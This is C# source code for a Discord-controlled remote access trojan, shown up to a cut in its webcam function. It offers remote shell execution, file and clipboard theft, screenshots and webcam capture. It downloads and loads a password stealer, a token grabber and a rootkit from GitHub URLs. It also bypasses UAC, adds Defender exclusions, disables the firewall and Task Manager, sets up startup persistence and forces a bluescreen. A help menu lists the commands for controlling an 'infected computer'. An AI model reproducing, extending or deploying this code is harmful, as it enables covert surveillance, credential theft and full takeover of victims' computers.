using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.WebSockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
namespace Discord_rat
{

   public class WsClient : IDisposable
   {

       public int ReceiveBufferSize { get; set; } = 8192;
       public Func<Stream,Task> ResponseReceived;
       public bool connected=false;
       public async Task WaitUtillDead() 
       {
           while (connected) 
           {
                await Task.Delay(1000);
           }
       }
       public async Task ConnectAsync(string url)
       {
           if (WS != null)
           {
               if (WS.State == WebSocketState.Open) return;
               else WS.Dispose();
           }
           WS = new ClientWebSocket();
           if (CTS != null) CTS.Dispose();
           CTS = new CancellationTokenSource();
           await WS.ConnectAsync(new Uri(url), CTS.Token);
           await Task.Factory.StartNew(ReceiveLoop, CTS.Token, TaskCreationOptions.LongRunning, TaskScheduler.Default);
           connected = true; 
       }

       public async Task DisconnectAsync()
       {

            if (WS is null)
            {
                connected = false; 
                return;
            }
           if (WS.State == WebSocketState.Open)
           {
               CTS.CancelAfter(TimeSpan.FromSeconds(2));
               await WS.CloseOutputAsync(WebSocketCloseStatus.Empty, "", CancellationToken.None);
               await WS.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None);
           }
           WS.Dispose();
           WS = null;
           CTS.Dispose();
           CTS = null;
           connected = false;
        }
       private async Task ReceiveLoop()
       {
           var loopToken = CTS.Token;
           MemoryStream outputStream = null;
           WebSocketReceiveResult receiveResult = null;
           ArraySegment<byte> buffer = new ArraySegment<byte>(new byte[ReceiveBufferSize]);
           try
           {
               while (!loopToken.IsCancellationRequested)
               {
                    Console.WriteLine("e1");
                    outputStream = new MemoryStream(ReceiveBufferSize);
                   do
                   {
                       receiveResult = await WS.ReceiveAsync(buffer, CTS.Token);
                       if (receiveResult.MessageType != WebSocketMessageType.Close)
                           outputStream.Write(buffer.ToArray(), 0, receiveResult.Count);
                   }
                   while (!receiveResult.EndOfMessage);
                    if (receiveResult.MessageType == WebSocketMessageType.Close) {
                        break;
                    };
                   outputStream.Position = 0;
                   await Task.Factory.StartNew(() => ResponseReceived(outputStream));
                }
           }
           catch (Exception s) { Console.WriteLine(s); }
           finally
           {
              outputStream?.Dispose();
           }
       }

       public async Task SendMessageAsync(string message)
       {
           ArraySegment<byte> bytesToSend = new ArraySegment<byte>(Encoding.UTF8.GetBytes(message));
           await WS.SendAsync(bytesToSend, WebSocketMessageType.Text, true, CancellationToken.None);
       }
       public void Dispose() => DisconnectAsync().Wait();

       private ClientWebSocket WS;
       private CancellationTokenSource CTS;

   }
    public class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;
        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(
          int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();
        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }
        public static JavaScriptSerializer serializer = new JavaScriptSerializer();
        public static WsClient client = new WsClient();
        public static string BotToken = settings.Bottoken;
        public static string GuildId = settings.Guildid;
        public static string ChannelId = "unset";
        public static Dictionary<string, string> session_channel_holder = new Dictionary<string, string>();
        public static Dictionary<string, Assembly> dll_holder = new Dictionary<string, Assembly>();
        public static Dictionary<string, object> activator_holder = new Dictionary<string, object>();
        public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string> {
            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll"},
            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll"},
            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll"},
            { "webcam","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll"},
            { "token","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll"}
        };
        public static Dictionary<object, object> ObjectToDictionary(object obb)
        {
            return JsonToDictionary(DictionaryToJson(obb));
        }
        public static Dictionary<object, object>[] ObjectToArray(object obb)
        {
            return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
        }
        public static Dictionary<object, object> JsonToDictionary(string json)
        {
            return serializer.Deserialize<Dictionary<object, object>>(json);
        }
        public static string DictionaryToJson(object dict)
        {
            return serializer.Serialize(dict);
        }
        public static async Task Responsehandler(Stream inputStream)
        {
            StreamReader reader = new StreamReader(inputStream);
            var DictResult = JsonToDictionary(reader.ReadToEnd());
            Console.WriteLine(DictionaryToJson(DictResult));
            await handler(DictResult);
            inputStream.Dispose();
        }
        public static void Main(string[] args)
        {
            MainAsync().GetAwaiter().GetResult();
        }
        public static async Task MainAsync()
        {
            client.ResponseReceived = Responsehandler;
            await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encording=json");
            await client.WaitUtillDead();
        }
        public static async Task heartbeat(int milliseconds)
        {
            while (client.connected)
            {
                await Task.Delay(milliseconds);
                var data = new Dictionary<object, object> { { "op", 1 }, { "d", 5 } };
                var text = DictionaryToJson(data);
                Console.WriteLine(text);
                await client.SendMessageAsync(text);
            }
        }
        public static async Task login(string token)
        {
            int intent = 32767;
            var data = new Dictionary<object, object> { { "op", 2 }, { "d", new Dictionary<object, object> { { "token", token }, { "intents", intent }, { "properties", new Dictionary<object, object> { { "os", "linux" }, { "browser", "chrome" }, { "device", "chrome" } } } } } };
            string text = DictionaryToJson(data);
            Console.WriteLine(text);
            await client.SendMessageAsync(text);
        }
        public static async Task<string> CreateHostingChannel(Dictionary<object, object> data)
        {
            var guilds_id = ObjectToDictionary(data["d"])["id"];
            var channels = ObjectToDictionary(data["d"])["channels"];
            int biggest = 1;
            foreach (Dictionary<object, object> dict in ObjectToArray(channels))
            {
                if ((int)dict["type"] == 0)
                {
                    if (((string)dict["name"]).StartsWith("session-"))
                    {
                        session_channel_holder[(string)dict["name"]] = dict["id"].ToString();
                        var g = int.Parse(string.Join("", ((string)dict["name"]).ToCharArray().Where(Char.IsDigit)));
                        if (g >= biggest)
                        {
                            biggest = g + 1;
                        }
                    }
                }
            }
            string url = string.Format("https://discord.com/api/v9/guilds/{0}/channels", (string)guilds_id);
            var payload = new Dictionary<object, object> { { "name", "session-" + biggest.ToString() }, { "type", 0 } };
            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
            var result = await httpClient.PostAsync(url, content);
            result.EnsureSuccessStatusCode();
            var response = await result.Content.ReadAsStringAsync();
            var newdict = JsonToDictionary(response);
            var new_channel_id = newdict["id"];
            httpClient.Dispose();
            string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", "session-" + biggest.ToString(),await getip(), Environment.UserName,(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
            await Send_message((string)new_channel_id, starting_payload);
            return (string)new_channel_id;
        }
        public static async Task handler(Dictionary<object, object> data)
        {
            switch (data["op"])
            {
                case 10:
                    await login(BotToken);
                    await heartbeat((int)ObjectToDictionary(data["d"])["heartbeat_interval"]);
                    break;
                case 11:
                    Console.WriteLine("recived heartbeat");
                    break;
                case 0:
                    switch (data["t"])
                    {
                        case "READY":
                            var user = ObjectToDictionary(ObjectToDictionary(data["d"])["user"]);
                            Console.WriteLine(user["username"] + "#" + user["discriminator"]);
                            break;
                        case "GUILD_CREATE":
                            var guilds_id = ObjectToDictionary(data["d"])["id"];
                            if ((string)guilds_id == GuildId)
                            {
                                var main_channel_id = await CreateHostingChannel(data);
                                ChannelId = main_channel_id;
                            }
                            break;
                        case "MESSAGE_CREATE":
                            var d = ObjectToDictionary(data["d"]);
                            var guild_id = d["guild_id"];
                            var channel_id = d["channel_id"];
                            var message_content = d["content"];
                            var bot = false;
                            List<string> tempList = new List<string>();
                            string[] attachment_urls;
                            var attachments = d["attachments"];
                            foreach (Dictionary<object, object> dict in ObjectToArray(attachments))
                            {
                                tempList.Add((string)dict["url"]);
                            }
                            attachment_urls = tempList.ToArray();
                            if (ObjectToDictionary(d["author"]).ContainsKey("bot")) bot = (bool)ObjectToDictionary(d["author"])["bot"];
                            if ((string)guild_id == GuildId && (string)channel_id == ChannelId && !bot)
                            {
                                await CommandHandler((string)message_content, attachment_urls);
                            }
                            break;
                        case "CHANNEL_CREATE":
                            d = ObjectToDictionary(data["d"]);
                            if ((string)d["guild_id"] == GuildId)
                            {
                                if (((string)d["name"]).StartsWith("session-"))
                                {
                                    session_channel_holder[(string)d["name"]] = d["id"].ToString();
                                }

                            }
                            break;
                        case "CHANNEL_DELETE":
                            d = ObjectToDictionary(data["d"]);
                            if ((string)d["id"] == ChannelId && ChannelId != "unset")
                            {
                                Application.Exit();
                                Environment.Exit(0);
                            }
                            break;
                    }
                    break;
            }


        }
        public static async Task<bool> Send_message(string channelid, string message)
        {
            string url = string.Format("https://discord.com/api/v9/channels/{0}/messages", channelid);
            var payload = new Dictionary<object, object> { { "content", message } };
            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
            try
            {
                var result = await httpClient.PostAsync(url, content);
                result.EnsureSuccessStatusCode();
                var response = await result.Content.ReadAsStringAsync();
                httpClient.Dispose();
                return true;
            }
            catch
            {
                httpClient.Dispose();
                return false;
            }
        }
        public static async Task<bool> Send_attachment(string channelid, string message, List<byte[]> attachments, string[] filenames)
        {
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent form = new MultipartFormDataContent();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            form.Add(new StringContent(message), "content");
            int count = 0;
            foreach (var details in filenames.Zip(attachments, Tuple.Create))
            {
                form.Add(new ByteArrayContent(details.Item2, 0, details.Item2.Length), String.Format("files[{0}]", count.ToString()), details.Item1);
                count++;
            }
            try
            {
                HttpResponseMessage response = await httpClient.PostAsync(string.Format("https://discord.com/api/v9/channels/{0}/messages", channelid), form);
                response.EnsureSuccessStatusCode();
                httpClient.Dispose();
                return true;
            }
            catch
            {
                httpClient.Dispose();
                return false;
            }
        }
        public static byte[] StringToBytes(string input)
        {
            return Encoding.UTF8.GetBytes(input);
        }
        public static async Task ShellCommand(string command, string channelid)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo = new System.Diagnostics.ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process.Start();
            string data = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task Speak(string channelid, string message)
        {
            using (SpeechSynthesizer synth = new SpeechSynthesizer())
            {
                synth.SetOutputToDefaultAudioDevice();
                Prompt color = new Prompt(message);
                synth.Speak(color);
            }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task dir(string channelid)
        {
            string data = String.Join("\n", Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task upload(string channelid, string filepath)
        {
            byte[] data;
            try { data = File.ReadAllBytes(filepath); } catch { await Send_message(channelid, "File not found!"); return; }
            if (data.Length > 7500000)
            {
                using (var multipartFormContent = new MultipartFormDataContent())
                {
                    await Send_message(channelid, "File larger than 8mb, please wait while we upload to a third party!");
                    HttpClient httpClient = new HttpClient();
                    var byteContent = new ByteArrayContent(data);
                    multipartFormContent.Add(byteContent, name: "file", fileName: Path.GetFileName(filepath));
                    var response = await httpClient.PostAsync("https://file.io/", multipartFormContent);
                    response.EnsureSuccessStatusCode();
                    httpClient.Dispose();
                    var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
                    if ((bool)dict["success"] == true)
                    {
                        string link = (string)dict["link"];
                        await Send_message(channelid, "File uploaded, heres the download link!\n" + link);
                        await Send_message(ChannelId, "Command executed!");
                    }
                    else
                    {
                        await Send_message(channelid, "Error with uploading file!");
                    }
                }
            }
            else
            {
                await Send_attachment(channelid, "", new List<byte[]>() { data }, new string[] { Path.GetFileName(filepath) });
                await Send_message(ChannelId, "Command executed!");
            }
        }
        public static async Task<byte[]> LinkToBytes(string link)
        {
            Stream stream = new MemoryStream();
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync(link);
            await response.Content.CopyToAsync(stream);
            stream.Position = 0;
            byte[] buffer = new byte[stream.Length];
            for (int totalBytesCopied = 0; totalBytesCopied < stream.Length;)
                totalBytesCopied += stream.Read(buffer, totalBytesCopied, Convert.ToInt32(stream.Length) - totalBytesCopied);
            return buffer;
        }
        public static async Task BytesToWallpaper(string channelid, byte[] picture)
        {
            string path = Path.GetTempFileName() + ".png";
            try
            {
                File.WriteAllBytes(path, picture);
            }
            catch
            {
                await Send_message(channelid, "Error writing file!");
                return;
            }
            try
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                try { File.Delete(path); } catch { }
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                try { File.Delete(path); } catch { }
                await Send_message(channelid, "Error setting wallpaper!");
            }

        }
        [STAThread]
        public static async Task GetClipboard(string channelid)
        {
            string data = null;
            try
            {
                Exception threadEx = null;
                Thread staThread = new Thread(
                    delegate ()
                    {
                        try
                        {
                            data = Clipboard.GetText();
                        }

                        catch (Exception ex)
                        {
                            threadEx = ex;
                        }
                    });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {
                await Send_message(channelid, "Error getting clipboard!");
                return;
            }
            if (data == null) { await Send_message(channelid, "Clipboard empty!"); return; }
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }
        public static long GetLastInputTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            if (!GetLastInputInfo(ref lastInPut))
            {
                throw new Exception(GetLastError().ToString());
            }
            return lastInPut.dwTime;
        }
        public static async Task GetScreenshot(string channelid)
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            Stream stream = new MemoryStream();
            bmpScreenshot.Save(stream, ImageFormat.Png);
            stream.Position = 0;
            byte[] buffer = new byte[stream.Length];
            for (int totalBytesCopied = 0; totalBytesCopied < stream.Length;)
                totalBytesCopied += stream.Read(buffer, totalBytesCopied, Convert.ToInt32(stream.Length) - totalBytesCopied);
            await Send_attachment(channelid, "", new List<byte[]>() { buffer }, new string[] { "screenshot.png" });
            await Send_message(ChannelId, "Command executed!");
        }
        public static async Task Delete(string id)
        {
            string url = "https://discord.com/api/v9/channels/" + id;
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            try { await httpClient.DeleteAsync(url); } catch { }
        }
        public static async Task Kill(string session)
        {
            if (session.ToLower() == "all")
            {
                foreach (string i in session_channel_holder.Keys)
                {
                    if (!(session_channel_holder[i] == ChannelId)) await Delete(session_channel_holder[i]);
                }
                await Delete(ChannelId);
            }
            else
            {
                if (session_channel_holder.ContainsKey(session.ToLower())) await Delete(session_channel_holder[session.ToLower()]);
            }
        }
        public static async Task uacbypass(string path, string channelid)
        {
            Environment.SetEnvironmentVariable("windir", '"' + path + '"' + " ;#", EnvironmentVariableTarget.User);
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
                }
            };
            try
            {
                p.Start();
                await Task.Delay(1500);
            }
            catch 
            {
                await Send_message(channelid, "Error with uacbypass!");
            }
            Environment.SetEnvironmentVariable("windir", Environment.GetEnvironmentVariable("systemdrive") + "\\Windows", EnvironmentVariableTarget.User);
        }
        public static void Bluescreen()
        {
            bool tmp1;
            uint tmp2;
            RtlAdjustPrivilege(19, true, false, out tmp1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);

        }
        public static async Task ProcKill(string channelid, string procname)
        {
            Process[] runingProcess = Process.GetProcesses();
            for (int i = 0; i < runingProcess.Length; i++)
            {
                if (runingProcess[i].ProcessName == procname)
                {
                    runingProcess[i].Kill();
                }

            }
            await Send_message(channelid, "Command executed!");
        }
        public static async Task DisableDefender(string channelid)
        {
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "powershell.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "-Command Add-MpPreference -ExclusionPath \"C:\\\""
                }
            };
            p.Start();
            await Send_message(channelid, "Command executed!");
        }
        public static async Task DisableFirewall(string channelid)
        {
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "NetSh.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "Advfirewall set allprofiles state off"
                }
            };
            p.Start();
            await Send_message(channelid, "Command executed!");
        }
        public static async Task PlayAudio(string channelid, byte[] audio)
        {
            using (MemoryStream ms = new MemoryStream(audio))
            {
                System.Media.SoundPlayer player = new System.Media.SoundPlayer(ms);
                player.Play();
            }
            await Send_message(channelid, "Command executed!");
        }
        public static void critproc()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        public static void uncritproc()
        {
            int isCritical = 0;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
        public static void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null) objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        public static void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null) objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
        }
        public static void addstartupnonadmin()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("$77" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location), System.Reflection.Assembly.GetEntryAssembly().Location);
        }
        public static void addstartupadmin()
        {
            string x = String.Format("/create /tn \"{1}\" /tr \"'{0}'\" /sc onlogon /rl HIGHEST", System.Reflection.Assembly.GetEntryAssembly().Location, "$77" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = x
                }
            };
            p.Start();
        }
        public static async Task<string> geolocate()
        {
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
            response.EnsureSuccessStatusCode();
            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
            string link = String.Format("http://www.google.com/maps/place/{0},{1}", dict["latitude"].ToString(), dict["longitude"].ToString());
            return link;
        }
        public static async Task<string> getip()
        {
            HttpClient httpClient = new HttpClient();
            var response = await httpClient.GetAsync("https://geolocation-db.com/json");
            response.EnsureSuccessStatusCode();
            var dict = JsonToDictionary(await response.Content.ReadAsStringAsync());
            return dict["IPv4"].ToString();
        }
        public static async Task getprocs(string channelid) 
        {
            List<string> temp = new List<string>();
            foreach (Process i in Process.GetProcesses()) 
            {
                temp.Add(i.ProcessName);
            }
            string data= string.Join("\n", temp);
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "output.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task LoadDll(string name, byte[] data) 
        {
            dll_holder[name] = Assembly.Load(data);
        }
        public static async Task<string> password() 
        {
            if (!dll_holder.ContainsKey("password")) await LoadDll("password", await LinkToBytes(dll_url_holder["password"]));
            dynamic instance = Activator.CreateInstance(dll_holder["password"].GetType("PasswordStealer.Stealer"));
            MethodInfo runMethod = instance.GetType().GetMethod("Run",BindingFlags.Instance | BindingFlags.Public);
            string passwords = (string)runMethod.Invoke(instance, new object[] { });
            return passwords;
        }
        public static async Task sendpassword(string channelid)
        {
            string data = await password();
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "password.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static void rootkitaddpid(int pid)
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\pid");
            rk.SetValue(Path.GetRandomFileName(), pid, RegistryValueKind.DWord);
            rk.Close();
        }
        public static void rootkitaddpath(string path)
        {
            RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\$77config\paths");
            rk.SetValue(Path.GetRandomFileName(), path, RegistryValueKind.String);
            rk.Close();
        }

        public static async Task Rootkit(string channelid) 
        {
            if (!dll_holder.ContainsKey("rootkit")) await LoadDll("rootkit", await LinkToBytes(dll_url_holder["rootkit"]));
            Assembly a = dll_holder["rootkit"];
            MethodInfo m = a.EntryPoint;
            try
            {
                var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
                m.Invoke(null, parameters);
                rootkitaddpath(System.Reflection.Assembly.GetEntryAssembly().Location);
                rootkitaddpid(Process.GetCurrentProcess().Id);
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                await Send_message(channelid, "Error executing rootkit!");
            }
        }
        public static async Task UnRootkit(string channelid)
        {
            if (!dll_holder.ContainsKey("unrootkit")) await LoadDll("unrootkit", await LinkToBytes(dll_url_holder["unrootkit"]));
            Assembly a = dll_holder["unrootkit"];
            MethodInfo m = a.EntryPoint;
            try
            {
                var parameters = m.GetParameters().Length == 0 ? null : new[] { new string[0] };
                m.Invoke(null, parameters);
                await Send_message(channelid, "Command executed!");
            }
            catch
            {
                await Send_message(channelid, "Error removing rootkit!");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task helpmenu(string channelid) 
        {
            string data = "--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
            if (data.Length >= 1990)
            {
                await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "help.txt" });
                await Send_message(channelid, "Command executed!");
            }
            else
            {
                await Send_message(channelid, "```" + data + "```");
                await Send_message(channelid, "Command executed!");
            }
        }
        public static async Task webcampic(string channelid)
        {
            if (!dll_holder.ContainsKey("webcam")) await LoadDll("webcam", await LinkToBytes(dll_url_holder["webcam"]));
            if (!activator_holder.ContainsKey("webcam"))
            {
                activator_holder["webcam"] = Activator.CreateInstance(dll_holder["webcam"].GetType("Webcam.webcam"));
                activator_holder["webcam"].GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            }
            object active = activator_holder["webcam"];
            active.GetType().GetMethod("init").Invoke(activator_holder["webcam"], new object[] { });
            var cameras = active.GetType().GetField("cameras").GetValue(active) as IDictionary<int,string>;
            if (cameras.Count < 1) 
            {
                await Send_message(channelid, "No cameras found!");
                await Send_message(channelid, "Command executed!");
                return;
            }
            try
            {
                var runMethod = active.GetType().GetMethod("GetImage");
                byte[] imag = (byte[])runMethod.Invoke(active, new object[] { });
                await Send_attachment(channelid, "", new List<byte[]>() { imag }, new string[] { "webcam.jpg" });
                await Send_message(channelid, "Command executed!");
            }
            catch 
            {
